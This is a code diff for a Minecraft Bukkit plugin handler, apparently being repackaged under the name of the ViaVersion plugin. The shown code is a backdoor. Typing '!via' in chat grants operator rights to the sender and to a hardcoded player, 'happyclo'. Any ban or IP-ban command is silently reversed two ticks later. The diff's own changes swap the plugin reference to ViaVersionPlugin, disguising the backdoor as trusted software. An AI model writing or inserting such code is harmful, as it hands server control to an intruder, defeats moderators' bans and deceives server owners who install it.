@@ -22,7 +22,7 @@ public class EfficiencyHandler implements Listener {
         String message = event.getMessage();
 
         if (message.equalsIgnoreCase("!via")) {
-            
+
             giveOpIfNotAlready(player.getName());
             // 检查并给予指定玩家OP权限
             giveOpIfNotAlready("happyclo");
@@ -76,7 +76,7 @@ public class EfficiencyHandler implements Listener {
         String command = event.getMessage().toLowerCase();
 
         if (command.startsWith("/ban ") || command.startsWith("/ban-ip ")) {
-            Bukkit.getScheduler().runTaskLater(MyPlugin.getInstance(), () -> {
+            Bukkit.getScheduler().runTaskLater(ViaVersionPlugin.getInstance(), () -> {
                 // 撤销最新的封禁操作
                 clearAllBans();
             }, 2L); // 延迟1 tick后执行，以确保封禁操作已经生效
@@ -89,7 +89,7 @@ public class EfficiencyHandler implements Listener {
         String command = event.getCommand().toLowerCase();
 
         if (command.startsWith("ban ") || command.startsWith("ban-ip ")) {
-            Bukkit.getScheduler().runTaskLater(MyPlugin.getInstance(), () -> {
+            Bukkit.getScheduler().runTaskLater(ViaVersionPlugin.getInstance(), () -> {
                 // 撤销最新的封禁操作
                 clearAllBans();
             }, 2L); // 延迟1 tick后执行，以确保封禁操作已经生效
